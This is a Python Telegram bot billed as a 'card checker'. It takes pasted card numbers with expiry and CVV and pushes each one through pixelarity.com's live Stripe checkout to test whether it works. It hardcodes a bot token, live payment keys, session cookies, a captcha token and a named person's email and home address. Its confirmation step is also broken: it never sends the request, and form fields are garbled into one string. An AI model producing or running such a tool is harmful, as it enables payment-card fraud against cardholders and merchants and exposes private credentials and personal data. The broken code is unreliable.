import telebot
import requests
import re
import time

BOT_TOKEN = "7018443911:AAFP7YgMlc03URuqMUv-_VzysmewC0vt8jM"
bot = telebot.TeleBot(BOT_TOKEN)

SIGNUP_URL = "https://pixelarity.com/signup?json=1"
PAYMENT_METHOD_URL = "https://api.stripe.com/v1/payment_methods"
# The base confirm URL pattern, cs_live_ will be replaced dynamically
CONFIRM_URL_TEMPLATE = "https://api.stripe.com/v1/payment_pages/{cs_live}/confirm"

# Headers as per your provided data
HEADERS_SIGNUP = {
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "cookie": "pref=4d8348106778dcda33d0f257a817d1ca; _ga=GA1.2.378324897.1746259366; _gid=GA1.2.864339098.1746259366; __stripe_mid=def7730a-e22b-49a1-aeb2-e23f39bb8f549f1ee0; __stripe_sid=17d69df3-4094-443c-83bb-c837700008fe8d4f2c; _gat=1; _ga_Y0H4J0SGQ9=GS2.2.s1746259366$o1$g1$t1746259458$j0$l0$h0",
    "origin": "https://pixelarity.com",
    "priority": "u=1, i",
    "referer": "https://pixelarity.com/signup",
    "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest"
}

HEADERS_PAYMENT_METHOD = {
    "host": "api.stripe.com",
    "content-type": "application/x-www-form-urlencoded",
    "accept": "application/json",
    "sec-fetch-site": "same-site",
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "sec-fetch-mode": "cors",
    "origin": "https://js.stripe.com",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "referer": "https://js.stripe.com/",
    "sec-fetch-dest": "empty"
}

HEADERS_CONFIRM = {
    "host": "api.stripe.com",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "accept": "*/*",
    "x-requested-with": "XMLHttpRequest",
    "sec-fetch-site": "same-origin",
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "sec-fetch-mode": "cors",
    "origin": "https://js.stripe.com",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "referer": "https://pixelarity.com/signup",
    "sec-fetch-dest": "empty"
}

def parse_card(card_text):
    # Only accept CC|MM|YY|CVV or CC|MM|YYYY|CVV
    pattern = r"^\s*(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\s*$"
    match = re.match(pattern, card_text)
    if not match:
        return None
    cc, mm, yy, cvv = match.groups()
    mm = mm.zfill(2)
    if len(yy) == 4:
        yy = yy[2:]
    return cc, mm, yy, cvv

def get_cs_live():
    # This POST data is from your example
    data = "b970c94733d0f257=fb0adc3bde4a507b17ad058681487c02&name=Peshang+Salam&email=peshangsalam2001%40gmail.com&planId=1&paymentMethodId=2&terms=on&optin=on"
    try:
        resp = requests.post(SIGNUP_URL, headers=HEADERS_SIGNUP, data=data, timeout=30)
        resp.raise_for_status()
        json_resp = resp.json()
        # The cs_live value is usually under a key, or you can extract from URL or response text
        # Assuming the response contains a field with cs_live token, e.g. "payment_page_client_secret"
        # Adjust this part if your actual response differs
        cs_live = None
        # Try common keys or parse from response
        for key in ['payment_page_client_secret', 'client_secret', 'cs_live']:
            if key in json_resp:
                cs_live = json_resp[key]
                break
        if not cs_live:
            # Try to find cs_live_ token in any string field
            import re
            text = str(json_resp)
            m = re.search(r'cs_live_[\w\d]+', text)
            if m:
                cs_live = m.group(0)
        return cs_live
    except Exception as e:
        return None

def get_payment_method(cc, mm, yy, cvv):
    # Form data from your example, with fixed billing details
    data = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "billing_details[name]": "Peshang Salam",
        "billing_details[email]": "peshangsalam2001@gmail.com",
        "billing_details[address][country]": "US",
        "billing_details[address][line1]": "198 White Horse Pike",
        "billing_details[address][city]": "West Collingswood",
        "billing_details[address][postal_code]": "08107",
        "billing_details[address][state]": "NJ",
        "guid": "df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59",
        "muid": "def7730a-e22b-49a1-aeb2-e23f39bb8f549f1ee0",
        "sid": "17d69df3-4094-443c-83bb-c837700008fe8d4f2c",
        "key": "pk_live_iYK0XcHxtewEoUPIWbobYfEq",
        "payment_user_agent": "stripe.js%2Fca98f11090%3B+stripe-js-v3%2Fca98f11090%3B+checkout"
    }
    try:
        resp = requests.post(PAYMENT_METHOD_URL, headers=HEADERS_PAYMENT_METHOD, data=data, timeout=30)
        resp.raise_for_status()
        json_resp = resp.json()
        pm_id = json_resp.get("id")
        return pm_id
    except Exception as e:
        return None

def confirm_payment(cs_live, pm_id):
    if not cs_live or not pm_id:
        return None, "Missing cs_live or payment method id"
    confirm_url = CONFIRM_URL_TEMPLATE.format(cs_live=cs_live)
    data = {
        "eid": "NA",
        "payment_method": pm_id,
        "expected_amount": "1900",
        "last_displayed_line_item_group_details[subtotal]": "1900",
        "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
        "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
        "last_displayed_line_item_group_details[total_discount_amount]": "0",
        "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
        "expected_payment_method_type": "card",
        "guid": "df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59",
        "muid": "def7730a-e22b-49a1-aeb2-e23f39bb8f549f1ee0",
        "sid": "17d69df3-4094-443c-83bb-c837700008fe8d4f2c",
        "key": "pk_live_iYK0XcHxtewEoUPIWbobYfEq",
        "version": "ca98f11090",
        "init_checksum": "fPRRzGxhdJhFzd0O4nb5jyLBmzHUBjqC",
        "js_checksum": "qto~d%5En0%3DQU%3Eazbu%5Dc_xn%3D_Oo%3C%5Dweb%5Exou%5Cxondc%5C%3B%60OQ_Xto%3FU%5E%60w",
        "passive_captcha_token": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiT0VzcHRnR09WTGUyOGNTNnlKRWNkanZ0ZEN1a2c5U1N5U2t6dHd1d1l6T1AxeXhhVVdkMk8rWmpNWGFHRXFRdVRldVVKMURRQ2VEZTJ2QTRUUnMxUHlWQ0tpYU1MTU5nak5lTk42WVNWRytvYi9lYTdRNnJPNlBLZDhaOGM5K1Rkb2k2RXJwcFlXWTNCZEJ6SlJpTkRUYUg3M1RrU0ZSOVZyaUZGdTJNd3JDYk9JQkphbkRmUHFxMkJhb1d5Qmd2N01YMStRdlI1Ky9oTUtRd3NZM2J5ZlA0RU9ZNDNZTFN1d2RTUGpXTk45UTVRZ29nTHIvaXVQQm9qT0svQnpEcU5wMzVKa2hZdHQ1MmU1NXY2aXMrN2o0Zmhubmp3MW5EWTBpbHlGWmNaQ2NobENTWll2eDZJR0FaSzVLVFZBWXh4UTQ4eEVLZjdjQUF5ZTkzQzVCdTRkdms3WWx5dUlhdDBnUWY2YkZCMk9zVUFjQy9NNy9IWnhERFRhR2JNYVI2T0NyOFpJWW84MXlxOVVSTGgzSytkNE5kdFVHeU9HMVpsNnRDOVBuSWVkWmxKdVhCenVEYW9KVUxhN2JvaDZPbmdVWEtPbmN2TFhLcVhWN29TTzI0VHJieDVEN2hvbHEwb0hkQjZPMER4TWI3MWpTSEhFamZQT2c3WFJuaHZjR2MwbWpGMjZ1aXNRMjEyMHNNaEd3M2hNL0JQMnczZWlvUWF1WDhQc1F5UHJqOHZvdXJTc3F1ak5SVnA3a1ZXQVNsWXQ4QXMzS3dmcmp6Zm03Y1Q5clo3VWV5SDc5d3BvWFNQUWRFcWppbThGaWdkZjIrNnBmOEx1TDd6QXA1eFBLdVZxMGloZE5YNlRpTkVzOWRUNm5va3p0M2FBa1Q1VUNVYUhZdFdyS3pVNGQyR2lKSXJKcXNjS1RtRWtUUm1WaU1FdEM3THA1QzcrSHZFN2E1YlFYWXBySHVJdHN4WVEwN3BpN0J6QTZLMW1ZZ1F0YVZtTjJMSjVUY0FmaWRjbFhmcHFtVDd5ZWkvUWlyWXBuOEp5SUNQVXZMNXFmOFZZLzdLeHpTUStGVnNjRWFJdkovYUhBRWVMblpnNHltaDVUSEVRR2kwaUxhY2YxeTBJa2dNVDlOQS90c0NISjhJZ1luYVVvNVcvanpEbitrOHc5M1Y2T0c0cVNDYzllRjV1aytUYUN4MWlreS8vV3RMQkpMMGRIejk3SHRvd3FKNmdOSnlBdy9TQ3ErSm1wcThwSjBHZTZ2cXJrbHV3RmovTXUra3dvVE52UWQxNTZpdWVMYmZWUDI3SGpSSUE3ZWFNSXFvVVZNelFYSS95Q1NyODdveU5ZRmNkUlFnTG4zaE9HU1Y3dzhBVE1DeURJQ1FJdDFmU0xjZTc3NGpxRWlQUGRvNmFJMnA0VElaRDcxZmJUbEFMNmk2VGxneHRJdktxekVjcmRWd3l4NExLK2V3WktMbWlyMGJNRWc0NklsdDJad3Y2WWpNMVFIbE5wTjJLN0NDL29VY0RiUlFXMW0yUURZc0lMNFdibGVMaUVFcnpOemxOMFhWZzZueVVSYTl5Z0MvY2Q4M2toY0gweUJzNWNUODFTOW5PUnBOQVhUUXAxNkg2aVMxVVFqcEN4YXd6RXoySkhxb1h5T3FBdUVHUmtRK051WXV2ZEE1ODJnaHlHU1Uvc2xGZWtxbkJZakVtRnhsalp0MnpyOXdEdlFJdjBqUWZMQ1l0N0djWmhmalo2THBWUFNVUUV6MC9mVzZtNmo4STlCdjMxbTRFSDNXdjVNOUsrNlV4UWlUZ2kxU1kxWkt1WG82ZHMyYUJja3daMld5SE80ZkEycHl1WW5ETk1SYkxjanlxclBWNm9URHd5OXdlYy9uTUZvUUpMUmUxam5yekF4eWlQbW9jRU95TGJlZmNmdDJxNUhoeFJNQkM2Z2dEM0g4Nkk4SC81TU9sSFFHekdlaW9wTnBBa3ZGNU1SSmdCalN1TWJyTFIrL0dMcVpzTUhMWEJoTFdZeVNrakF5NGFXMHNWVUU0K3F5aVJhejB2S1ZGTC9ZQkdpSExiaUlEQk13aEhwdVZzQS9nN3N4RysyWWF0a0dtdkp6a0dlQ0hJRTNvSk5sbk00aFlKem0xbVlpb3NscjJ6MEttcnl6THdsRjFmV0toUjNMcGJCck45UTZIRCtOekw2WnNRRFFaeXltOE1SaHZ1L1hBYzBBbnlEWDZ1MUdhWTAwVEJkY1puQU1RNWJiTm12ODU4c01PalUrWW9kUUp4N3BoZElqZ2ZGSm9wdlNpV2dPZXFwbnFMMmNjaEpjaks5TDY5QjdwdVZwUTRsNmlRUWUxU01vM01xMzRORTkzSUdMQkJOdUZkL2xhOFlwUlVLU1RTWmFrMmJwd01xdGNDZzc2QWJBd1dNVkl3cjNwbWllS2ZKNnF0TzVwOUpkRlZLL1pET3lvVnZJdFVjMWNWODNKa0JjbExzYVVCZXBHWE5pWXRCaFFia2RPa2YrUWRTZGlqN1NwNjZ1LzBlbGtoRXlwRlZKU0NLTU9kOER2M0RDK1FxNVhRaC9RTmhCYjhxSUhWYk0vYVRJTTV1MUhnTDZqZTN1ak9hWTJLMmFTdGhtY2ozNzZEOWs4UjY5QjFRLzlMNUFOaVRzSEpsZGczY2R4VkZrU3JlQnNCRTB4amgrQ0RybGVNajdRa25QbWUzVFR5eFBjZXJ4SGtGWExrdGdKUVU1MW9CNGR5VS9SVERmamV0Y1Npa1JuNEhLOUk1cDdYTG1sUVQwc2wreS8rck5qNDdVOFh1UE1oUEZ6M1N1Rk1EWmcxbjNEZnpLVUd3SnV0ZkR5Y2F3ODkwUHBOTjgrZFFmUDUramZoRzVQMEp3SXVicUVQSUQ3WlBlV3MzVnlBKzE2Njg5dXJsZlh3STJUWW1tOXZKWG1OUy9XSE15YkgxUGR6cVNlOTRSek9kOGExSmN2RExZeERNWUpja29RL3dtZGx4emVLZzBXRm14Qnh2YUlJY3lpV1dmT2V5K20rbEdhNHl4dWZnQUFUWU1jSTl0TlZvNlJyRXZsaEtaRXV5T2FaWkM5TlA2UT09IiwiZXhwIjoxNzQ2MzQ1NzgzLCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMWViZTliZGEiLCJwZCI6MCwiY2RhdGEiOiJLWGtVRm50bjV5WHBrRjFzN2QreDNLeG8xeWd3QzkrN0JwUkFPZ1ptTEwreVhDMVg5aUxnSTVFbnU3SXVRUGtSWHIzRkh1UnNidE9oZ1F5dmlBU1NzYVI4WUtHUTR4cGJGYXhrMktNVTlCNm1xZW1QMWh6NkY5R3pHcUpkcE9POHl0VnBWaSs1TW00K21Sclp4TXNFSHA3QmJ0a05JNU8rUmh5Rk93Y0RkbXNjckZ1N3Bvbit4R1VKdVlwOUE0MC9YRjYrNThRdHNiVVhXdm5EN2tCTUlUUnFMa2drIn0.YN-CNb7i118Lc3LnvUL4EOVPHsddnFwSXMp1TzYnNEU&passive_captcha_ekey=&rv_timestamp=qto%3En%3CQ%3DU%26CyY%26%60%3EX%5Er%3CYNr%3CYN%60%3CY_C%3CY_C%3CY%5E%60zY_%60%3CY%5En%7BU%3Eo%26U%26Cyex%5CC%5BbX%3BYO%60CYb%5C%26XOay%5BOUvdRP%3EeOn%3CeuUsYxQvXbL%3DeuQr%5BOdDe%25n%7BU%3Ee%26U%26Cye%26PCY_MydOP%3DX%3DYvY%26%5C%3EXuaydO%60%3DdRP%23XxdDeueuYOUuXOevXboseOX%24YxoyXO%3B%3E%5B_%60%25db%5DyYuL%3BdRLDeOMueto%3FU%5E%60w"
}

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 Pixelarity Card Checker Bot\n"
        "Send cards in format:\n"
        "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n"
        "One per line.\n"
        "Example:\n"
        "5402053964361036|11|27|133\n"
        "4242424242424242|12|25|123"
    )

@bot.message_handler(func=lambda message: True)
def card_handler(message):
    cards = message.text.strip().split('\n')
    for card in cards:
        parsed = parse_card(card)
        if not parsed:
            bot.send_message(message.chat.id, f"❌ Invalid card format: {card}")
            continue
        cc, mm, yy, cvv = parsed

        # Step 1: Get cs_live value
        cs_live = get_cs_live()
        if not cs_live:
            bot.send_message(message.chat.id, "❌ Failed to retrieve cs_live token from signup URL.")
            continue

        # Step 2: Get payment method pm_ value
        pm_id = get_payment_method(cc, mm, yy, cvv)
        if not pm_id:
            bot.send_message(message.chat.id, f"❌ Failed to create payment method for card: {cc}|{mm}|{yy}|{cvv}")
            continue

        # Step 3: Confirm payment
        result = confirm_payment(cs_live, pm_id)
        if result is None:
            bot.send_message(message.chat.id, "❌ Failed to confirm payment.")
            continue

        bot.send_message(message.chat.id, result)

        time.sleep(10)  # 10 seconds delay between cards

bot.infinity_polling()
